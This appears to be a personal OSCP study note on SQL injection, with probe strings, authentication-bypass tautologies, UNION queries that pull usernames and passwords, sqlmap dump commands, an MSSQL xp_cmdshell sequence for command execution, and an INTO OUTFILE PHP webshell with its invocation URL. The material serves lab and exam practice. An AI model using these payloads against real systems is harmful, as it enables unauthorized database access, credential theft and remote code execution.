[[Synced OSCP Notes/Tools/SQLmap|SQLmap]]
[[1433 MSSQL]]
[[3306 MySQL]]
[[PostgresSQL]]
[[SQLite]]

4 Databases RCE
https://medium.com/@0x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed

```
cd /usr/share/wordlists/seclists/Fuzzing/Databases/
```

```
cat /usr/share/wordlists/seclists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt
```

---

| Category         | What you're checking                                                       |
| ---------------- | -------------------------------------------------------------------------- |
| Error-based      | Does malformed SQL cause a database error?                                 |
| Boolean-based    | Does a true condition produce a different response from a false condition? |
| Time-based       | Does a conditional database delay affect response time?                    |
| Input handling   | Are quotes, special characters and SQL syntax handled differently?         |
| Parameterisation | Is user input treated as data rather than executable SQL?                  |

---
# 🧠 SQL Injection Payloads

### Baseline the Parameter

First, send the original request normally and observe the response.  
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `GET /products?id=1  `;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```

Note:  
1. Status code  
2. Response length  
3. Content
4. Whether the page displays a record 
5. Any errors  
  
Then compare against invalid inputs:  
  
```
1  
999999  
-1  
0  
abc 
``` 
  
This establishes how the application behaves with valid, nonexistent, negative, and non-numeric values.  
  
---  
### Basic syntax-breaking probes 

Single quote  
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `' `;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
Double quote
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `"`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
 Parentheses
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `)`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `')`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `"))`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
Quote and comment combinations  
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `'--`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `'#`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `'/* `;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `' OR '`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `' OR 1=1-- `;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");

const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `' OR 1=2--`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 250);
    } catch {
        button.textContent = "Copy failed";
    }
});
```
  
Look for:  
1. SQL errors  
2. HTTP 500  
3. Different page contents  
4. Different number of results  
5. A response that changes between logically true and false conditions  
6. A quote causing an error is a clue, not proof of SQL injection.  
  
  
---  
  
3. Boolean-based testing  
  
This is one of the most useful manual tests.  
  
Try logically equivalent true and false conditions.  
  
Numeric parameter  
  
1 AND 1=1  
  
1 AND 1=2  
  
1 OR 1=1  
  
1 OR 1=2  
  
String parameter  
  
' AND '1'='1  
  
' AND '1'='2  
  
' OR '1'='1  
  
' OR '1'='2  
  
If the true condition produces one response and the false condition produces a meaningfully different response, you may have a boolean-based injection point.  
  
For string parameters, quote closure and comment syntax depend on the underlying query, so these are probes rather than universal payloads.  
  
  
---  
  
4. Comment syntax  
  
Different DBMSs support different comment styles. Test the ones relevant to the context.  
  
Comment Syntax  
  
Single-line --  
Hash #  
Block /* comment */  
  
  
Examples:  
  
'--  
  
'#  
  
'/*  
  
Note that -- often requires whitespace or another character after the two dashes, depending on the database.  
  
Also, URL encoding, application filtering, and how the parameter is inserted into the query can affect whether the comment works.  
  
  
---  
  
5. UNION injection — initial probes  
  
If the parameter appears injectable and the application displays query results, investigate whether the query accepts a UNION and whether the result is reflected.  
  
Start by determining the number of columns using the ORDER BY approach:  
  
' ORDER BY 1--  
  
' ORDER BY 2--  
  
' ORDER BY 3--  
  
' ORDER BY 4--  
  
Continue incrementing until the query errors or the response changes significantly.  
  
Then investigate whether the column types and output locations are compatible with the application's original query.  
  
Don't assume that the number of visible fields on the webpage equals the number of columns in the underlying query.  
  
  
---  
  
6. Identify the database engine  
  
Database identification matters because MySQL, MSSQL, PostgreSQL, Oracle, and SQLite have different syntax, functions, error behavior, and capabilities.  
  
DBMS Common clues  
  
MySQL / MariaDB MySQL-specific errors, LIMIT, characteristic syntax  
Microsoft SQL Server MSSQL errors, TOP, T-SQL syntax  
PostgreSQL PostgreSQL-specific errors, LIMIT, RETURNING  
Oracle Oracle errors, ROWNUM, Oracle-specific syntax  
SQLite SQLite errors, lightweight embedded database characteristics  
H2 Java-based database, H2 error messages, database console  
  
  
Don't identify the DBMS based solely on LIMIT or other syntax shared between engines.  
  
  
---  
  
7. Error-based clues  
  
When testing, pay attention to error messages mentioning:  
  
Syntax errors  
  
Incorrect quoting  
  
Column count mismatches  
  
Data type conversion errors  
  
Invalid identifiers  
  
Database-specific function names  
  
Table or column names  
  
SQL parser names  
  
  
Even if the application suppresses errors, differences in response behavior can still provide useful clues.  
  
  
---  
  
8. Time-based testing
Use this only when you have reason to suspect injection but the application gives you no visible output or useful errors.  
  
A time-based test involves comparing the response time of a normal request against a controlled conditional delay.  
  
Different DBMSs have different delay functions and syntax. Don't blindly paste the same time-delay expression into every database.  
  
For a lab:  
  
1. Send the normal request several times and establish its baseline response time.  
  
  
2. Introduce a controlled delay condition.  
  
  
3. Repeat the test.  
  
  
4. Compare timings rather than trusting one slow request.  
  
  
  
A single slow response is not evidence of SQL injection; network latency and application load can produce false positives.  
  
  
---  
  
My recommended testing order  
  
When you find a potentially injectable parameter, follow this sequence:  
  
Order Test Objective  
  
1 Baseline request Understand normal behavior  
2 ' Detect quote-related errors  
3 " Detect double-quoted context  
4 Parenthesis probes Determine whether the query is nested  
5 True condition Observe true-condition behavior  
6 False condition Compare against true-condition behavior  
7 Comment syntax Determine whether trailing query syntax can be neutralized  
8 ORDER BY incrementing Estimate column count  
9 UNION investigation Determine whether output can be reflected  
10 DBMS identification Establish engine-specific syntax  
11 Timing tests Investigate blind injection  
12 sqlmap Automate confirmation and further testing

---
## Basic Test

```
test'
```

```
test''
```

## 🔓 Basic authentication bypass

Closes the username string and adds an always-true condition.
```
test' OR 1=1-- -
```

Same technique, using a string comparison.
```
test' OR '1'='1-- -
```

Uses an empty-string comparison that is always true.
```
test' OR ''=''
```

---

## 👤 Username-based bypass

Attempts to preserve a username prefix while adding an always-true condition.
```
username' OR 1=1--
```

Attempts to terminate the username string and comment out the remaining SQL query.

```
username'--
```

---

## 🧪 Common tautology bypass

Attempts a tautology without a username prefix.
```
' OR '1'='1'--
```

Same tautology using different characters.
```
' OR 'a'='a'--
```

---
## Boolean Testing

**Test C — True condition**

```
test' AND '1'='1'-- -
```

**Test D — False condition**

```
test' AND '1'='2'-- -
```

---

## Errors as hints

Learn to recognise database fingerprints in error messages.

- `System.Data.SqlClient` → MSSQL
- `MySQL` / `mysqli` → MySQL
- `org.postgresql` / `PSQLException` → PostgreSQL
- `ORA-` error codes → Oracle

- ---
## Exploit

```
1'; EXEC <MSSQL_COMMAND>;--
```

## RCE 

```
test' ; EXECUTE sp_configure 'show advanced options', 1;;--
```

```
test' ; RECONFIGURE;;--
```

```
test' ; EXECUTE sp_configure 'xp_cmdshell', 1;;--
```

```
test' ; RECONFIGURE;;--
```

```
test' ; EXECUTE xp_cmdshell 'powershell -e [payload]';;--
```

---
# SQL Injection

```
# LOGIN FORM
username: ***
password: ***
```

```sqlite
SELECT * FROM user_table WHERE username='' AND password='';
```

# ALWAYS TRUE ATTACK

## ERROR-BASED SQLi, Always True Attack

```
# LOGIN FORM
username: admin
password: 1234
```

```
'
username: admin'
password: 1234
```

```sqlite
SELECT * FROM user_table WHERE username='admin'' AND password='1234';
```

```
' OR 1=1
username: admin' OR 1=1
password: 1234
```

```sqlite
SELECT * FROM user_table WHERE username='admin' OR 1=1' AND password='1234';
```

```
' OR 1=1 ; -- 
username: admin' OR 1=1
password: 1234
```

```sqlite
SELECT * FROM user_table WHERE username='admin' OR 1=1; -- ' AND password='1234';

SELECT * FROM user_table WHERE username='admin' OR 1=1;
SELECT * FROM user_table WHERE 1=1;
SELECT * FROM user_table;
```

---
## 🧬 UNION-based injection (data extraction / testing columns)

```
' UNION SELECT 1, '<user-fieldname>', '<pass-fieldname>'--
```


---
## SQL injection UNION attack, determining the number of columns returned by the query


1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the `category` parameter, giving it the value `'+UNION+SELECT+NULL--`. Observe that an error occurs.
3. Modify the `category` parameter to add an additional column containing a null value:
    
    `'+UNION+SELECT+NULL,NULL--`
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

## Test which column is text

```
'+UNION+SELECT+NULL,NULL,NULL--
```

or use #

Replace the NULL with 'a'

```
'+UNION+SELECT+NULL,'a',NULL--
```


## The database contains a different table called `users`, with columns called `username` and `password`.

' UNION SELECT username, password FROM users--


## Find out number of columns + which column accepts string, then payload 

```
username||'~'||password+FROM+users--
```

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

---

## Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries to determine the database version for some popular database types:

|                  |                           |
| ---------------- | ------------------------- |
| Database type    | Query                     |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

For example, you could use a `UNION` attack with the following input:

```
'+UNION+SELECT+@@version
```

This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:

`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`

---

## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

```
SELECT * FROM information_schema.tables
```

This returns output like the following:

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ---------- |
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

This returns output like the following:

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
| ------------- | ------------ | ---------- | ----------- | --------- |
| MyDatabase    | dbo          | Users      | UserID      | int       |
| MyDatabase    | dbo          | Users      | Username    | varchar   |
| MyDatabase    | dbo          | Users      | Password    | varchar   |

This output shows the columns in the specified table and the data type of each column.

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the list of tables in the database:
    
```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
1. Find the name of the table containing user credentials.
2. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

1. Find the names of the columns containing usernames and passwords.
2. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    

```
'+UNION+SELECT+username_wlpbfk,+password_nskzww+FROM+users_gowlqt--
```

---


SQLMAP

Intercept a web request of "test", copy the post request and save it to a file called reset.req

Feed this to SQLmap

```
sqlmap -r reset.req -p email --batch
```

```
sqlmap -r reset.req -p email --batch --level 3
```

get a list of the available databases
```
sqlmap -r reset.req -p email --batch --level 3 --dbs
```

enumerate tables in database
```
sqlmap -r reset.req -p email --batch --level 3 -D [database_name] --tables --threads=10
```

dump a table's contents
```
sqlmap -r reset.req -p email --batch --level 3 -D [database_name] -T [table_name] --dump
```

---

[[Hashcat|Hashcat]]

---

![[Pasted image 20260526210214.png]]

```
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
```
 
Burpsuite payload, upload a webshell.

Since nmap scan told us port 3305 is open, we are uploading the webshell there

Visit
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}:3305/webshell.php?cmd=id`;

dv.paragraph("```bash\n" + command + "\n```");
```
